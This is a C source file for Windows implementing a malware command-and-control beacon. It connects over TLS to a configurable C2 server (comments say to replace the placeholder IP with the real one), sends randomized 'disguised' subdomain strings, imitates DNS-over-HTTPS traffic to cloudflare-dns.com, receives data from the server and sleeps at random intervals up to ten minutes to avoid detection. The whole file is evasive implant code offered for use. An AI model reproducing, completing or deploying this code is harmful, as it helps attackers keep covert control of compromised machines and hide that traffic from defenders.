#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <time.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024
#define C2_SERVER_IP "127.0.0.1"  // Replace with actual C2 server IP
#define C2_SERVER_PORT 443        // Replace with actual C2 server port

// Initialize Winsock
int initialize_winsock() {
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 1;
    }
    return 0;
}

// Initialize OpenSSL
SSL_CTX* initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    
    if (!ctx) {
        printf("Error initializing OpenSSL context.\n");
        return NULL;
    }
    return ctx;
}

// Clean up OpenSSL
void cleanup_openssl() {
    EVP_cleanup();
}

// Randomized sleep
void random_sleep() {
    int sleep_time = (rand() % 600) * 1000;  // Random sleep up to 10 minutes
    Sleep(sleep_time);
}

// Function to generate random subdomains
void generate_random_subdomain(char* buffer, size_t size) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < size - 1; i++) {
        buffer[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    buffer[size - 1] = '\0';
}

// Create obfuscated DNS query
void create_disguised_dns_query(char* buffer, const char* domain) {
    char subdomain[BUFFER_SIZE];
    generate_random_subdomain(subdomain, 10);  // Generate random subdomain
    sprintf(buffer, "%s.%s", subdomain, domain);
}

// Mimic legitimate DoH request
void mimic_legitimate_doh_request() {
    const char* doh_request_template = "GET /dns-query?name=%s&type=A HTTP/1.1\r\nHost: cloudflare-dns.com\r\n\r\n";
    char doh_request[BUFFER_SIZE];
    sprintf(doh_request, doh_request_template, "example.com");
    
    printf("Mimicking DoH request: %s\n", doh_request);
}

// Establish connection to C2 server using SSL
SSL* connect_to_c2(SSL_CTX* ctx) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_SERVER_PORT);
    inet_pton(AF_INET, C2_SERVER_IP, &server_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        printf("Failed to create socket.\n");
        return NULL;
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        printf("Failed to connect to C2 server.\n");
        closesocket(sock);
        return NULL;
    }

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) <= 0) {
        printf("SSL handshake failed.\n");
        SSL_free(ssl);
        closesocket(sock);
        return NULL;
    }

    printf("Connected to C2 server with SSL.\n");
    return ssl;
}

// Send disguised data to C2 server
void send_disguised_data(SSL* ssl) {
    char dns_query[BUFFER_SIZE];
    create_disguised_dns_query(dns_query, "example.com");

    if (SSL_write(ssl, dns_query, strlen(dns_query)) <= 0) {
        printf("Failed to send data to C2.\n");
    } else {
        printf("Disguised data sent to C2 server.\n");
    }
}

// Receive response from C2 server
void receive_data_from_c2(SSL* ssl) {
    char buffer[BUFFER_SIZE];
    int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
    if (bytes_received > 0) {
        buffer[bytes_received] = '\0';
        printf("Received data from C2 server: %s\n", buffer);
    } else {
        printf("No data received from C2 server.\n");
    }
}

// Main loop that communicates with the C2 server while performing random actions
void main_loop(SSL* ssl) {
    while (1) {
        int random_action = rand() % 3;

        if (random_action == 0) {
            send_disguised_data(ssl);
        } else if (random_action == 1) {
            mimic_legitimate_doh_request();
        } else {
            receive_data_from_c2(ssl);
        }

        random_sleep();
    }
}

int main() {
    srand(time(NULL));  // Seed random number generator

    // Initialize Winsock
    if (initialize_winsock() != 0) {
        return 1;
    }

    // Initialize OpenSSL
    SSL_CTX* ctx = initialize_openssl();
    if (!ctx) {
        WSACleanup();
        return 1;
    }

    // Connect to C2 server using SSL
    SSL* ssl = connect_to_c2(ctx);
    if (!ssl) {
        SSL_CTX_free(ctx);
        WSACleanup();
        return 1;
    }

    // Enter the main communication loop with the C2 server
    main_loop(ssl);

    // Cleanup
    SSL_shutdown(ssl);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    cleanup_openssl();
    WSACleanup();

    return 0;
}
